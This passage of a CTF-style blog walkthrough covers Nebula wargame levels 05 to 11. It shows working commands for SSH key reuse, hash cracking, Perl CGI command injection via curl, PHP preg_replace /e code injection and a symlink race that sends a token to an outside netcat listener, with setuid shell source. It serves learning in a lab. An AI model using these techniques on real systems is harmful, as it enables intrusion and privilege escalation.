-rw-r--r-- <span style="color:#ae81ff">1</span> flag05 flag05   <span style="color:#ae81ff">675</span> 2011-05-18 02:54 .profile
drwx------ <span style="color:#ae81ff">2</span> flag05 flag05    <span style="color:#ae81ff">70</span> 2011-11-20 20:13 .ssh

level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x <span style="color:#ae81ff">2</span> flag05 flag05    <span style="color:#ae81ff">42</span> 2011-11-20 20:13 .
drwxr-x--- <span style="color:#ae81ff">4</span> flag05 level05   <span style="color:#ae81ff">93</span> 2012-08-18 06:56 ..
-rw-rw-r-- <span style="color:#ae81ff">1</span> flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz

level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys

level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
The authenticity of host <span style="color:#e6db74">&#39;127.0.0.1 (127.0.0.1)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>127.0.0.1<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span> to the list of known hosts.

<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level06">level06</h2>
<p><a href="https://exploit-exercises.com/nebula/level05/">Level06&rsquo;s Description</a>:</p>
<blockquote>
<p>The flag06 account credentials came from a legacy unix system.</p>
</blockquote>
<p>Legacy unix system? This immediately had me thinking that the password hash may be in <code>/etc/passwd</code>. Older unix systems used to store passwords this way, but that is no longer the case.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</code></pre></div><p>The hash <code>ueqwOCnSGdsuM</code> is something that I had to send to <code>john</code> to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ <span style="color:#75715e"># cat hash</span>
ueqwOCnSGdsuM

~ <span style="color:#75715e"># john hash</span>
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Traditional DES <span style="color:#f92672">[</span>128/128 BS SSE2<span style="color:#f92672">])</span>
hello            <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
guesses: <span style="color:#ae81ff">1</span>  time: 0:00:00:00 DONE <span style="color:#f92672">(</span>Fri May  <span style="color:#ae81ff">8</span> 17:29:20 2015<span style="color:#f92672">)</span>  c/s: <span style="color:#ae81ff">102400</span>  trying: <span style="color:#ae81ff">123456</span> - Pyramid
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</code></pre></div><p>The password is <code>hello</code>.
So, to solve level06:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level07">level07</h2>
<p><a href="https://exploit-exercises.com/nebula/level07/">Level07&rsquo;s Description</a>:</p>
<blockquote>
<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Perl program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/perl</span>

<span style="color:#66d9ef">use</span> CGI <span style="color:#e6db74">qw{param}</span>;

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Content-type: text/html\n\n&#34;</span>;

<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">ping</span> {
  $host <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];

  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&#34;</span>);

  @output <span style="color:#f92672">=</span> <span style="color:#e6db74">`ping -c 3 $host 2&gt;&amp;1`</span>;
  <span style="color:#66d9ef">foreach</span> $line (@output) { <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$line&#34;</span>; }

  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>);

}

<span style="color:#75715e"># check if Host set. if not, display normal page, etc</span>

ping(param(<span style="color:#e6db74">&#34;Host&#34;</span>));
</code></pre></div><p>This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the <code>flag07</code> directory one can see a <code>thttpd.conf</code> file which contains the port of the webserver serving this script on.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level07@nebula:/home/flag07$ grep port thttpd.conf
<span style="color:#75715e"># Specifies an alternate port number to listen on.</span>
port<span style="color:#f92672">=</span><span style="color:#ae81ff">7007</span>
<span style="color:#75715e"># all hostnames supported on the local machine. See thttpd(8) for details.</span>
</code></pre></div><p>Exploiting the vulnerability simply meant that we have to inject commands into the <code>Host</code> parameter. I normally use python&rsquo;s urllib to ensure that fields are properly url encoded etc.</p>
<p>So, to solve level07:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ » curl -v <span style="color:#e6db74">&#34;http://192.168.217.239:7007/index.cgi?</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;import urllib; print urllib.urlencode({ &#34;Host&#34; : &#34;127.0.0.1 &amp;&amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;&amp; chmod 4777 /var/tmp/flag07&#34; })&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 <span style="color:#f92672">(</span>192.168.217.239<span style="color:#f92672">)</span> port <span style="color:#ae81ff">7007</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
&gt; GET /index.cgi?Host<span style="color:#f92672">=</span>127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
&gt; User-Agent: curl/7.37.1
&gt; Host: 192.168.217.239:7007
&gt; Accept: */*
&gt;
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 <span style="color:#ae81ff">200</span> OK
&lt; Content-type: text/html
&lt;
&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
<span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_req<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.011 ms
<span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_req<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.023 ms
<span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_req<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.022 ms

--- 127.0.0.1 ping statistics ---
<span style="color:#ae81ff">3</span> packets transmitted, <span style="color:#ae81ff">3</span> received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.011/0.018/0.023/0.007 ms
* Closing connection <span style="color:#ae81ff">0</span>
&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre></div><p>And finally back on the NebulaVM after this curl from my host:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level08">level08</h2>
<p><a href="https://exploit-exercises.com/nebula/level08/">Level08&rsquo;s Description</a>:</p>
<blockquote>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
</blockquote>
<p>Logging in as the user <code>level08</code> reveals a pcap in the <code>flag08</code> directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap

level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file <span style="color:#f92672">(</span>little-endian<span style="color:#f92672">)</span> - version 2.4 <span style="color:#f92672">(</span>Ethernet, capture length 65535<span style="color:#f92672">)</span>
</code></pre></div><p>I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:</p>
<figure>
    <img src="https://leonjza.github.io/images/nebula_level8_pcap.png"/> 
</figure>

<p>Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the <code>level8</code> account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.</p>
<figure>
    <img src="https://leonjza.github.io/images/nebula_level8_tcp_stream.png"/> 
</figure>

<p><code>F7</code> according to the ASCII table is a backspace. That makes this easy :) Considering we have the password <code>backdoor...00Rm8.ate</code>, substituting the dot with backspaces we end up with <code>backd00Rmate</code> as the password.</p>
<p>So, to solve level08:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level08@nebula:/home/flag08$ su - flag08
Password:

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level09">level09</h2>
<p><a href="https://exploit-exercises.com/nebula/level09/">Level09&rsquo;s Description</a>:</p>
<blockquote>
<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">spam</span>($email)
{
  $email <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\./&#34;</span>, <span style="color:#e6db74">&#34; dot &#34;</span>, $email);
  $email <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/@/&#34;</span>, <span style="color:#e6db74">&#34; AT &#34;</span>, $email);

  <span style="color:#66d9ef">return</span> $email;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">markup</span>($filename, $use_me)
{
  $contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);

  $contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/(\[email (.*)\])/e&#34;</span>, <span style="color:#e6db74">&#34;spam(</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>, $contents);
  $contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\[/&#34;</span>, <span style="color:#e6db74">&#34;&lt;&#34;</span>, $contents);
  $contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\]/&#34;</span>, <span style="color:#e6db74">&#34;&gt;&#34;</span>, $contents);

  <span style="color:#66d9ef">return</span> $contents;
}

$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">markup</span>($argv[<span style="color:#ae81ff">1</span>], $argv[<span style="color:#ae81ff">2</span>]);

<span style="color:#66d9ef">print</span> $output;

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>In the <code>flag09</code> directory, we have the above PHP sample as well as a SUID binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- <span style="color:#ae81ff">1</span> flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">491</span> 2011-11-20 21:22 flag09.php
</code></pre></div><p>At first I managed to solve this one really fast. When <code>flag09</code> is invoked with <code>-h</code>, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell

php &gt; system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)</span>;
uid<span style="color:#f92672">=</span>1010<span style="color:#f92672">(</span>level09<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1010<span style="color:#f92672">(</span>level09<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>990<span style="color:#f92672">(</span>flag09<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>990<span style="color:#f92672">(</span>flag09<span style="color:#f92672">)</span>,1010<span style="color:#f92672">(</span>level09<span style="color:#f92672">)</span>
</code></pre></div><p>With this I would have been able to prepare the small <code>flag09</code> setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.</p>
<p>The PHP code basically had 2 main functions. <code>markup()</code> and <code>spam()</code>. <code>markup()</code> would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching <code>[email addr]</code> where <em>addr</em> will be the extracted part. It then as a callback executes <code>spam()</code> which will convert <code>.</code> to <code>dot</code> and <code>@</code> to <code>AT</code>. I took a really long time researching the <code>preg_replace()</code> functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when <code>preg_replace()</code> is called with the <code>e</code> modifier. <a href="http://www.madirish.net/402">This</a> blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a> helps develop a payload for exploitation. The PHP documentation has a sample of <code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</code> which is what I used to finish the final payload for this level.</p>
<p>Another thing to note about the PHP code is the <code>$use_me</code> variable passed to the <code>markup()</code> function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)</p>
<p>So, to solve level09:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level09@nebula:/home/flag09$ echo -ne <span style="color:#e6db74">&#34;[email {\${system(\$use_me)}}]&#34;</span> &gt; /var/tmp/flag09.txt

level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
<span style="color:#f92672">[</span>email <span style="color:#f92672">{</span><span style="color:#e6db74">${</span>system($use_me)<span style="color:#e6db74">}</span><span style="color:#f92672">}]</span>

level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt <span style="color:#e6db74">&#34;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&#34;</span>
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php<span style="color:#f92672">(</span>15<span style="color:#f92672">)</span> : regexp code on line <span style="color:#ae81ff">1</span>

level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h3 id="intermission">intermission</h3>
<p>From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)</p>
<p>I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!</p>
<h2 id="level10">level10</h2>
<p><a href="https://exploit-exercises.com/nebula/level10/">Level10&rsquo;s Description</a>:</p>
<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file;
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host;

  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
      printf(<span style="color:#e6db74">&#34;%s file host</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">sends file to host if you have access to it</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
      exit(<span style="color:#ae81ff">1</span>);
  }

  file <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
  host <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];

  <span style="color:#66d9ef">if</span>(access(argv[<span style="color:#ae81ff">1</span>], R_OK) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
      <span style="color:#66d9ef">int</span> fd;
      <span style="color:#66d9ef">int</span> ffd;
      <span style="color:#66d9ef">int</span> rc;
      <span style="color:#66d9ef">struct</span> sockaddr_in sin;
      <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">4096</span>];

      printf(<span style="color:#e6db74">&#34;Connecting to %s:18211 .. &#34;</span>, host); fflush(stdout);

      fd <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);

      memset(<span style="color:#f92672">&amp;</span>sin, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in));
      sin.sin_family <span style="color:#f92672">=</span> AF_INET;
      sin.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(host);
      sin.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">18211</span>);

      <span style="color:#66d9ef">if</span>(connect(fd, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
          printf(<span style="color:#e6db74">&#34;Unable to connect to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
          exit(EXIT_FAILURE);
      }

<span style="color:#75715e">#define HITHERE &#34;.oO Oo.\n&#34;
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(write(fd, HITHERE, strlen(HITHERE)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
          printf(<span style="color:#e6db74">&#34;Unable to write banner to host %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, host);
          exit(EXIT_FAILURE);
      }
<span style="color:#75715e">#undef HITHERE
</span><span style="color:#75715e"></span>
      printf(<span style="color:#e6db74">&#34;Connected!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Sending file .. &#34;</span>); fflush(stdout);

      ffd <span style="color:#f92672">=</span> open(file, O_RDONLY);
      <span style="color:#66d9ef">if</span>(ffd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
          printf(<span style="color:#e6db74">&#34;Damn. Unable to open file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
          exit(EXIT_FAILURE);
      }

      rc <span style="color:#f92672">=</span> read(ffd, buffer, <span style="color:#66d9ef">sizeof</span>(buffer));
      <span style="color:#66d9ef">if</span>(rc <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
          printf(<span style="color:#e6db74">&#34;Unable to read from file: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(<span style="color:#e6db74">&#34;wrote file!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  } <span style="color:#66d9ef">else</span> {
      printf(<span style="color:#e6db74">&#34;You don&#39;t have access to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, file);
  }
}
</code></pre></div><p>As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with <code>nc -lk 18211</code> and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the <code>flag10</code> binary as I did not have read access to this.</p>
<p>The problem with this program through is the fact that it checks if the file can be read using <code>access()</code>, then only later opens it using <code>open()</code>. Using this method it may be possible to change out the file before it hits the <code>open()</code> method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called <a href="http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU</a>. The Wikipedia article describes almost exactly the same scenario as we have here.</p>
<p>My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the <code>flag10</code> binary in its own loop as well.</p>
<p>So, to solve level10:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level10@nebula:/home/flag10$ <span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; <span style="color:#66d9ef">done</span> &amp;
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">14219</span>

<span style="color:#75715e"># the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.</span>

level10@nebula:/home/flag10$ <span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> ./flag10 /var/tmp/flag10-token 192.168.217.1; <span style="color:#66d9ef">done</span>
You don<span style="color:#e6db74">&#39;t have access to /var/tmp/flag10-token
</span><span style="color:#e6db74">You don&#39;</span>t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
</code></pre></div><p>On my netcat listener I now had:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ » nc -lk <span style="color:#ae81ff">18211</span>
.oO Oo.
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    setresuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">())</span>;
    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
</code></pre></div><p>With the token file read, we end the level:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level11">level11</h2>
<p><a href="https://exploit-exercises.com/nebula/level11/">Level11&rsquo;s Description</a>:</p>
<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/*
</span><span style="color:#75715e"> * Return a random, non predictable file, and return the file descriptor for it.
</span><span style="color:#75715e"> */</span>

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getrand</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>path)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tmp;
  <span style="color:#66d9ef">int</span> pid;
  <span style="color:#66d9ef">int</span> fd;

  srandom(time(NULL));

  tmp <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;TEMP&#34;</span>);
  pid <span style="color:#f92672">=</span> getpid();

  asprintf(path, <span style="color:#e6db74">&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>), <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>),
      <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>), <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>),
      <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>), <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> (random() <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>));

